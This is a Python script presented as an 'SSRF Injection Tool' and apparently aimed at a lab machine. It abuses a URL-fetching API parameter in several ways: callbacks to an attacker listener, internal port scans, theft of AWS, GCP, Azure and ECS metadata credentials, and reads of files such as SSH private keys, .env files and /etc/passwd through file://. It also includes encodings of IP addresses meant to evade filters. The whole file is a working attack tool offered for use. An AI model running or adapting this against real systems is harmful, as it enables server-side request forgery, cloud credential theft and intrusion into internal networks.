#!/usr/bin/env python3
"""
SSRF Injection Tool
Targets APIs that fetch remote resources via user-supplied parameters.

Modes:
  1. OOB Detection       — confirm SSRF via callback to your listener
  2. Internal Port Scan  — discover open internal ports via timing/response diff
  3. Cloud Metadata      — steal creds from AWS/GCP/Azure IMDS
  4. File Read           — read internal files via file:// (if supported)
  5. Custom URL          — send any URL through the SSRF primitive

Bypass encodings built in:
  - Raw URL
  - Base64
  - URL-encoded
  - Decimal IP (127.0.0.1 → 2130706433)
  - Hex IP     (127.0.0.1 → 0x7f000001)
  - Octal IP   (127.0.0.1 → 0177.0.0.1)
  - IPv6 loopback
"""

import requests
import base64
import urllib.parse
import sys
import socket
import struct
import time

# ============================================================================
# CONFIG - change per target
# ============================================================================

TARGET_HOST   = "10.129.170.188"
TARGET_PORT   = "3000"
ENDPOINT      = "/api/userinfo"

# How the parameter is delivered — GET or POST
METHOD        = "GET"

# Parameter name that carries the URL
PARAM_NAME    = "id"

# If POST with JSON body, set this True and adjust build_request()
JSON_BODY     = False

# ============================================================================
# ENCODING HELPERS
# ============================================================================

def to_base64(url):
    return base64.b64encode(url.encode()).decode()

def to_urlencoded(url):
    return urllib.parse.quote(url, safe="")

def ip_to_decimal(ip):
    """Convert dotted-decimal IP to 32-bit integer string."""
    packed = socket.inet_aton(ip)
    return str(struct.unpack("!L", packed)[0])

def ip_to_hex(ip):
    packed = socket.inet_aton(ip)
    val = struct.unpack("!L", packed)[0]
    return f"0x{val:08x}"

def ip_to_octal(ip):
    parts = ip.split(".")
    return ".".join(f"0{int(p):o}" for p in parts)

def encode_url(url, mode):
    """
    Replace just the IP portion of a URL with an obfuscated form.
    Returns the full URL with the IP swapped.
    """
    # Extract the host from the URL
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname
    port = f":{parsed.port}" if parsed.port else ""
    rest = parsed.path
    if parsed.query:
        rest += f"?{parsed.query}"

    try:
        ip = socket.gethostbyname(host)
    except Exception:
        ip = host  # not resolvable, use as-is

    if mode == "raw":
        return url
    elif mode == "base64":
        return to_base64(url)
    elif mode == "urlencode":
        return to_urlencoded(url)
    elif mode == "decimal":
        return f"{parsed.scheme}://{ip_to_decimal(ip)}{port}{rest}"
    elif mode == "hex":
        return f"{parsed.scheme}://{ip_to_hex(ip)}{port}{rest}"
    elif mode == "octal":
        return f"{parsed.scheme}://{ip_to_octal(ip)}{port}{rest}"
    elif mode == "ipv6":
        return f"{parsed.scheme}://[::ffff:{ip}]{port}{rest}"
    elif mode == "short":
        # 127.1 shortform — loopback only
        if ip.startswith("127."):
            return f"{parsed.scheme}://127.1{port}{rest}"
        return url
    return url

ENCODINGS = ["raw", "base64", "urlencode", "decimal", "hex", "octal", "ipv6", "short"]

# ============================================================================
# REQUEST SENDER
# ============================================================================

def send(url_value):
    """Send the request with the given value in PARAM_NAME."""
    target = f"http://{TARGET_HOST}:{TARGET_PORT}{ENDPOINT}"
    try:
        if METHOD == "GET":
            r = requests.get(target, params={PARAM_NAME: url_value}, timeout=5)
        else:
            if JSON_BODY:
                r = requests.post(target, json={PARAM_NAME: url_value}, timeout=5)
            else:
                r = requests.post(target, data={PARAM_NAME: url_value}, timeout=5)
        return r
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request error: {e}")
        return None

# ============================================================================
# MODES
# ============================================================================

def mode_oob(callback_url):
    """
    Try all encodings against the callback URL.
    Watch your nc / interactsh listener for inbound connections.
    """
    print(f"\n[*] OOB Detection — trying all encodings against: {callback_url}")
    print(f"[*] Watch your listener!\n")

    for enc in ENCODINGS:
        val = encode_url(callback_url, enc)
        print(f"  [{enc:10s}] sending: {val[:80]}")
        r = send(val)
        status = r.status_code if r else "TIMEOUT"
        body   = r.text[:80].replace("\n", " ") if r else ""
        print(f"             → {status} | {body}\n")


def mode_portscan(internal_ip, ports):
    """
    Scan internal ports by timing and response differences.
    Open ports usually respond faster or with a different status/body.
    """
    print(f"\n[*] Port scanning {internal_ip} ...\n")
    results = []

    for port in ports:
        url = f"http://{internal_ip}:{port}"
        start = time.time()
        r = send(encode_url(url, "raw"))
        elapsed = time.time() - start

        if r is None:
            status = "TIMEOUT"
            body = ""
        else:
            status = str(r.status_code)
            body = r.text[:60].replace("\n", " ")

        tag = "[OPEN?]" if (r and r.status_code != 500) else "[closed]"
        print(f"  {tag} {internal_ip}:{port:5d} → {status} ({elapsed:.2f}s) | {body}")
        results.append((port, status, elapsed, body))

    print("\n[+] Scan complete")
    return results


def mode_metadata():
    """
    Try common cloud metadata endpoints.
    Tries multiple encodings for each to bypass filters.
    """
    endpoints = {
        "AWS IMDSv1 - root":       "http://169.254.169.254/latest/meta-data/",
        "AWS IMDSv1 - IAM creds":  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "AWS IMDSv1 - user-data":  "http://169.254.169.254/latest/user-data",
        "GCP metadata":            "http://metadata.google.internal/computeMetadata/v1/",
        "Azure metadata":          "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "AWS ECS creds":           "http://169.254.170.2/v2/credentials/",
    }

    # IP obfuscation variants for 169.254.169.254
    meta_ip    = "169.254.169.254"
    meta_alts  = [
        f"http://{ip_to_decimal(meta_ip)}/latest/meta-data/",
        f"http://{ip_to_hex(meta_ip)}/latest/meta-data/",
        f"http://{ip_to_octal(meta_ip)}/latest/meta-data/",
        f"http://[::ffff:{meta_ip}]/latest/meta-data/",
    ]

    print("\n[*] Probing cloud metadata endpoints...\n")

    for label, url in endpoints.items():
        print(f"  [-] {label}")
        r = send(encode_url(url, "raw"))
        if r:
            print(f"      → {r.status_code} | {r.text[:120].replace(chr(10), ' ')}")
        else:
            print(f"      → TIMEOUT")
        print()

    print("[*] Trying IP-obfuscated variants for AWS...\n")
    for url in meta_alts:
        enc_label = url.split("//")[1].split("/")[0]
        r = send(url)
        status = r.status_code if r else "TIMEOUT"
        body = r.text[:80].replace("\n", " ") if r else ""
        print(f"  [{enc_label}] → {status} | {body}")

    print("\n[*] Trying base64 encoding for AWS root...\n")
    b64 = to_base64("http://169.254.169.254/latest/meta-data/")
    r = send(b64)
    status = r.status_code if r else "TIMEOUT"
    body = r.text[:80].replace("\n", " ") if r else ""
    print(f"  [base64] → {status} | {body}")


def mode_file_read():
    """Read internal server files via file:// if supported."""
    files = [
        "/etc/passwd",
        "/etc/hosts",
        "/etc/hostname",
        "/proc/self/environ",
        "/proc/version",
        "/root/.ssh/id_rsa",
        "/home/app/.env",
        "/var/www/html/.env",
    ]

    print("\n[*] File read mode — trying file:// URIs\n")
    print("[*] Enter paths to read (or press Enter to try defaults, 'exit' to quit)\n")

    custom = input("  Custom path (or Enter for defaults): ").strip()
    if custom and custom != "exit":
        files = [custom]

    for path in files:
        url = f"file://{path}"
        r = send(url)
        if r:
            print(f"\n  [+] {path} → {r.status_code}")
            print(f"  {r.text[:300]}")
        else:
            print(f"  [-] {path} → TIMEOUT/no response")

    if not custom:
        print("\n[*] Enter paths interactively (type 'exit' to quit)\n")
        while True:
            path = input("  file> ").strip()
            if path.lower() in ["exit", "q"]:
                break
            if not path:
                continue
            r = send(f"file://{path}")
            if r:
                print(f"  → {r.status_code} | {r.text[:300]}\n")
            else:
                print("  → no response\n")


def mode_custom():
    """Send any arbitrary URL, optionally with encoding."""
    print("\n[*] Custom URL mode\n")

    enc_list = "\n".join(f"  [{i+1}] {e}" for i, e in enumerate(ENCODINGS))
    print(f"  Encodings:\n{enc_list}\n")

    while True:
        url = input("  url> ").strip()
        if url.lower() in ["exit", "q"]:
            break
        if not url:
            continue

        enc_choice = input("  encoding [raw]: ").strip() or "raw"
        if enc_choice not in ENCODINGS:
            print(f"  [!] Unknown encoding. Options: {ENCODINGS}")
            continue

        val = encode_url(url, enc_choice)
        print(f"  [*] Sending: {val}")
        r = send(val)
        if r:
            print(f"  → {r.status_code}\n{r.text}\n")
        else:
            print("  → TIMEOUT\n")

# ============================================================================
# MAIN
# ============================================================================

COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 443, 3306, 5432, 6379,
    8080, 8443, 8888, 9000, 9200, 11211, 27017, 2375
]

def pick(options, prompt):
    print(f"\n  {prompt}")
    for i, o in enumerate(options, 1):
        print(f"  [{i}] {o}")
    while True:
        choice = input("  > ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(options):
            return int(choice) - 1
        print("  [!] Invalid choice")


def main():
    print("=" * 70)
    print("SSRF INJECTION TOOL")
    print("=" * 70)
    print(f"[*] Target   : http://{TARGET_HOST}:{TARGET_PORT}{ENDPOINT}")
    print(f"[*] Method   : {METHOD}")
    print(f"[*] Param    : {PARAM_NAME}")

    modes = [
        "OOB Detection (callback to your listener)",
        "Internal Port Scan",
        "Cloud Metadata (AWS/GCP/Azure)",
        "File Read (file://)",
        "Custom URL",
    ]

    idx = pick(modes, "Select mode:")

    if idx == 0:
        cb = input("\n  Callback URL (e.g. http://10.10.14.5:4444): ").strip()
        if cb:
            mode_oob(cb)

    elif idx == 1:
        ip = input("\n  Internal IP to scan [127.0.0.1]: ").strip() or "127.0.0.1"
        ports_input = input(f"  Ports (comma-sep, or Enter for common {len(COMMON_PORTS)}): ").strip()
        if ports_input:
            ports = [int(p.strip()) for p in ports_input.split(",")]
        else:
            ports = COMMON_PORTS
        mode_portscan(ip, ports)

    elif idx == 2:
        mode_metadata()

    elif idx == 3:
        mode_file_read()

    elif idx == 4:
        mode_custom()


if __name__ == "__main__":
    main()
